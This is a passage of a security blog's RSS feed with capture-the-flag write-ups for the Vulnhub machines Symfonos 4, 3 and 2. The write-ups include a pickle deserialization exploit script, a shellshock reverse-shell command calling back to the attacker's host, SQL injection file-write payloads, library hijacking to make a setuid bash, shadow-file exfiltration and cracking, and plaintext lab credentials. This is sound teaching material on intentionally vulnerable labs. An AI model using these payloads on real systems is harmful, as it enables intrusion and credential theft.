+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In the response we have www-data output. Now we can send our reverse shell payload.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-14.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Shell:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-15.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In the webroot we can read atlantis.php that had the login form and here we get db creds.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-16.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The discovered password is also the password for the poseidon user.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-17.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;p>Performing some manual enumeration locally for privesc paths, I took a look at local listening services. I
+discovered port 8080 which I used ssh portforwarding to access from my host.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-19.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>A simple web app is running.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-18.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Looking back at running processes, this appears to be a python app which is running as root. Looks like this is our
+path to privesc.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-21.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>In /opt I found the source code:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-20.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Based on the use of pickle, we need to exploit deserialization through the cookie.&lt;/p>
+&lt;p>I came up with the below script to generate a base64 encoded cookie which when deserialized
+will create a setuid binary of bash.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> jsonpickle
+&lt;span style="color:#f92672">import&lt;/span> base64
+&lt;span style="color:#f92672">import&lt;/span> os
+&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RCE&lt;/span>(object):
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">__reduce__&lt;/span>(self):
+cmd &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&amp;#39;&lt;/span>)
+&lt;span style="color:#66d9ef">return&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>system, (cmd,)
+encoded &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64encode(jsonpickle&lt;span style="color:#f92672">.&lt;/span>encode(RCE()))
+&lt;span style="color:#66d9ef">print&lt;/span>(encoded)
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-22.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Setting the cookie and sending the request using burpsuite:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-23.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We get suidbash&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-24.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>And we finally get a root shell:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-25.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="extras">Extras&lt;/h1>
+&lt;h2 id="checking-the-redirect-on-accessing-the-seaphp">Checking the redirect on accessing the sea.php.&lt;/h2>
+&lt;p>The code on sea.php only checks if the session isset but not what value it is set to. From atlantis.php when you send wrong creds,
+the &lt;code>$_SESSION['logged_in']&lt;/code> is set to false.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-27.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h2 id="sql-injection-on-atlantisphp-login-form">SQL Injection on atlantis.php login form.&lt;/h2>
+&lt;p>When you supply username &lt;code>admin' or 1=1-- -&lt;/code> and a random password we get a redirect to sea.php but with
+&lt;code>admin' and 1=2-- -&lt;/code> we get a incorrect login.&lt;/p>
+&lt;p>This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
+and exploit this with sqlmap.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-28.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sqlmap -r atlantis.req --batch --dump --level&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span> --risk&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> --threads&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was able to dump creds but they weren&amp;rsquo;t useful as I couldn&amp;rsquo;t crack the hash.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
+I tried this but couldn&amp;rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.&lt;/p>
+&lt;p>Using this payload in my post request to write to a file using select, we don&amp;rsquo;t get the usual redirect that
+signifies that the query was successful.&lt;/p>
+&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'2' INTO OUTFILE '/tmp/test.log'-- -&amp;amp;password=a
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-29.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The file is actually written to disk if we check the /tmp folder.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-30.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The reason that we don&amp;rsquo;t get a redirect is that no rows are returned by the query when writing files therefore
+the php code returns a false and doesn&amp;rsquo;t redirect to sea.php.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-31.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Now if we try to include the test.log in /tmp using the lfi, it fails. The reason for this is because some services are
+configured to have a private tmp folder which isn&amp;rsquo;t the same as the usual /tmp. The below answer I found explains this.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-32.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>If you look at the previous screenshot you&amp;rsquo;ll notice the folders beginning with systemd-private and one of those seem to
+belong to apache2.&lt;/p>
+&lt;p>With this knowledge, we need to use other directories to write files in. Since we are exploiting sql injection for this,
+we need folders that the mysql user can write. I discovered /var/lib/mysql and /dev/shm are suitable for this.&lt;/p>
+&lt;p>Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
+what you&amp;rsquo;re writing you&amp;rsquo;ll need to write to another non-existent file.&lt;/p>
+&lt;p>Testing this using /var/lib/mysql the file gets written.&lt;/p>
+&lt;pre>&lt;code>username=admin' and 1=2 Union Select 1,'test' INTO OUTFILE '/var/lib/mysql/123456.log'-- -&amp;amp;password=a
+&lt;/code>&lt;/pre>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-33.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Then accessing it using the lfi works this time.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos4/symfonos4-34.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Something else also to note is that the db user in this case is the mysql root user.&lt;/p></content></item><item><title>Vulnhub: Symfonos 3</title><link>https://blog.ikuamike.io/posts/2021/symfonos3/</link><pubDate>Thu, 11 Feb 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos3/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Intermediate&lt;/td>
+&lt;td>7 Apr 2020&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-31,332">https://vulnhub.com/entry/symfonos-31,332&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>In this box, we need to perform some directory bruteforce then use shellshock vulnerability to get our first shell.
+We then sniff local traffic using tcpdump and get credentials for the next user who has permissions to write python2.7 lib
+directory. Using those write permissions we hijack a library that is imported in a script that is executed by root in a
+cron job. We create a suid bash binary that we use to get a root shell.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;p>Nmap&lt;/p>
+&lt;pre>&lt;code class="language-nmap" data-lang="nmap">Nmap scan report for 192.168.191.130
+Host is up (0.00025s latency).
+PORT STATE SERVICE VERSION
+21/tcp open ftp ProFTPD 1.3.5b
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+| 2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
+| 256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
+|_ 256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
+80/tcp open http Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="http-80">HTTP (80)&lt;/h2>
+&lt;p>Visiting the IP on the browser, all we get is a picture.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Viewing the source doesn&amp;rsquo;t reveal much.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Performing a recursive directory bruteforce using ffuf with recursion enabled we get several directories.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u http://192.168.191.130/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion | tee ffuf.out.recurse
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Going to the research endpoint, there&amp;rsquo;s information about the Underworld and Greek mythology.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Some of the words look similar to the directories we discovered, so let&amp;rsquo;s create a wordlist which maybe helpful later.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">cewl http://192.168.191.130/gate/cerberus/tartarus/research -w words.txt
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The current directories we have discovered don&amp;rsquo;t have much in them. At this point I was stuck a bit, after looking at
+some writeups I realized that sometimes valid directories show when you have a trailing slash at the end. So I ran ffuf again
+with a trailing slash.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">ffuf -ic -c -u http://192.168.191.130/FUZZ/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt | tee ffuf.rootdir
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>With this idea, cgi-bin directory is discovered. This is a nice directory bruteforce tip I&amp;rsquo;ll use going forward. The presence of
+cgi-bin could potentially mean we can have a shellshock vulnerability.&lt;/p>
+&lt;p>Running another bruteforce using the wordlist I created earlier didn&amp;rsquo;t work. I then thought to get a lowercase version of the
+words and try it.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">cewl --lowercase http://192.168.191.130/gate/cerberus/tartarus/research -w words2.txt
+ffuf -ic -c -u http://192.168.191.130/cgi-bin/FUZZ -w words2.txt
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>With the lowercase wordlist, we get underworld.&lt;/p>
+&lt;p>To verify the shellshock vulnerability, we can send this request.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;cat /etc/passwd&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h1 id="shell-as-cerberus">Shell as cerberus&lt;/h1>
+&lt;p>After verifying this vulnerability, we can get a reverse shell.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">curl -A &lt;span style="color:#e6db74">&amp;#34;() { :; }; echo; echo; /bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.191.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span> http://192.168.191.130/cgi-bin/underworld
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>On running id we notice that cerberus is part of pcap group. To figure out what is unique about this group I used the find
+command.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">find / -group pcap -ls 2&amp;gt;/dev/null
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>This reveals we can run tcpdump, therefore we can sniff network traffic.&lt;/p>
+&lt;p>Before sniffing traffic, I used &lt;a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">pspy&lt;/a>
+to check for cron jobs and other commands being executed.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-9.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>With this I was able to pick up a cronjob that runs as root. Since ftpclient.py is being executed, I&amp;rsquo;ll sniff ftp
+traffic which isn&amp;rsquo;t typically encrypted.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">tcpdump port &lt;span style="color:#ae81ff">21&lt;/span> -n -i lo -A
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>From the tcpdump traffic we get new credentials, hades : PTpZTfU4vxgzvRBE.&lt;/p>
+&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
+&lt;p>Using the credentials we login to ssh as hades, running id reveals hades is in gods group.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-14.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Running find again reveals we have write permissions to /usr/lib/python2.7 folder.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">find / -group gods -ls 2&amp;gt;/dev/null
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-15.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Based on the earlier output of pspy, we saw a cronjob that was running as root and python2.7 was being executed. Therefore we can hijack
+any imports in that ftpclient.py script.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-16.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Since ftplib is imported, we&amp;rsquo;ll replace ftplib.py with this script&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> os
+os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;cp /bin/bash /tmp/bash&amp;#39;&lt;/span>)
+os&lt;span style="color:#f92672">.&lt;/span>system(&lt;span style="color:#e6db74">&amp;#39;chmod +s /tmp/bash&amp;#39;&lt;/span>)
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-17.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>This will create a setuid bash binary in /tmp. Which can use to gain root privileges.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos3/symfonos3-18.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: Symfonos 2</title><link>https://blog.ikuamike.io/posts/2021/symfonos2/</link><pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos2/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Difficulty&lt;/th>
+&lt;th>Release Date&lt;/th>
+&lt;th>Author&lt;/th>
+&lt;th>Machine link&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Intermediate&lt;/td>
+&lt;td>18 July 2019&lt;/td>
+&lt;td>Zayotic&lt;/td>
+&lt;td>&lt;a href="https://vulnhub.com/entry/symfonos-2,331">https://vulnhub.com/entry/symfonos-2,331&lt;/a>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h1 id="summary">Summary&lt;/h1>
+&lt;p>This box had quite a good number of misconfigurations and vulnerabilities. Initial access was through copying a shadow
+backup file to a smb share accessible anonymously using a file copy vulnerability in proftpd. Then lateral movement
+and privilege escalation was achieved by exploiting rce a locally running librenms instance and finally abusing
+sudo permissions on mysql to get root.&lt;/p>
+&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
+&lt;pre>&lt;code>Nmap scan report for 192.168.191.129
+Host is up (0.00028s latency).
+PORT STATE SERVICE VERSION
+21/tcp open ftp ProFTPD 1.3.5
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey:
+| 2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
+| 256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
+|_ 256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
+80/tcp open http WebFS httpd 1.21
+|_http-server-header: webfs/1.21
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
+Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
+|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery:
+| OS: Windows 6.1 (Samba 4.5.16-Debian)
+| Computer name: symfonos2
+| NetBIOS computer name: SYMFONOS2\x00
+| Domain name: \x00
+| FQDN: symfonos2
+|_ System time: 2021-01-25T07:02:21-06:00
+| smb-security-mode:
+| account_used: guest
+| authentication_level: user
+| challenge_response: supported
+|_ message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2021-01-25T13:02:21
+|_ start_date: N/A
+&lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="samba-139445">Samba (139/445)&lt;/h2>
+&lt;p>Running smbmap on the target we see we can access the &lt;strong>anonymous&lt;/strong> share without credentials:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -R -H 192.168.191.129
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/smbmap.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Using smbclient to download log.txt from the anonymous share.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.129&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N -c &lt;span style="color:#e6db74">&amp;#39;get backups\log.txt log.txt&amp;#39;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>From log.txt, we discover a backup of the shadow file is created in /var/backups/&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h2 id="ftp-21">FTP (21)&lt;/h2>
+&lt;p>Checking for known vulnerabilities of the proftp version using searchsploit, we find several.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>The command execution exploits available rely on creating a php file on the existing webserver that would be executed.
+However, the web server is running &lt;a href="https://github.com/ourway/webfsd" target="_blank" rel="noopener">webfs&lt;/a>
+which only serves static content.&lt;/p>
+&lt;p>We can only take advantage of the file copy vulnerability. From log.txt, the smb configuration gives the location
+of the anonymous share:&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We can exfiltrate information to the anonymous share by exploiting file copy on proftpd. Using the PoC shown here
+&lt;a href="https://www.exploit-db.com/exploits/36742,">https://www.exploit-db.com/exploits/36742,&lt;/a> let&amp;rsquo;s get the shadow.bak file. You can either use netcat or telnet.
+In this case I use netcat.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -vn 192.168.191.129 &lt;span style="color:#ae81ff">21&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Running smbmap command again we see that we have shadow.bak file.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;h2 id="shell-as-aeolus">Shell as aeolus&lt;/h2>
+&lt;p>After downloading the shadow file from the smb we can crack it with john and rockyou wordlist.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt shadow.bak
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Using sergioteamo as the password we can access ssh as aeolus.&lt;/p>
+&lt;p>Doing some basic manual enumeration, we see some ports listening on localhost.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>8080 would most likely be a webserver, so I&amp;rsquo;ll tunnel to it first using an ssh port forward.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -L 8000:127.0.0.1:8080 aeolus@192.168.191.129
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>When we visit http://127.0.0.1:8000 on the browser, we find that LibreNMS is running here.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Using searchsploit again we find two existing vulnerabilities for version 1.46.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Since we can&amp;rsquo;t verify the version of librenms currently running, we&amp;rsquo;ll try the exploits and see if they work. I&amp;rsquo;ll go for the RCE.&lt;/p>
+&lt;p>Using the exploit script provided here &lt;a href="https://www.exploit-db.com/exploits/47044,">https://www.exploit-db.com/exploits/47044,&lt;/a> we need to provide url, session cookies,
+rhost and rport where the reverse shell will be received.&lt;/p>
+&lt;p>Login using the earlier discovered credentials &lt;strong>aeolus : sergioteamo&lt;/strong>, then retrieve the cookies using burpsuite.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>Run the exploit as below and catch the reverse shell using netcat.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>We are now the cronus user.&lt;/p>
+&lt;h2 id="getting-a-root-shell">Getting a root shell&lt;/h2>
+&lt;p>Running sudo -l reveals cronus can run mysql as root with no password.&lt;/p>
+&lt;p>Dropping into mysql as root user, we can get a root shell using the below command.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#ae81ff">\!&lt;/span> bash
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
+&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
+&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p></content></item></channel></rss>
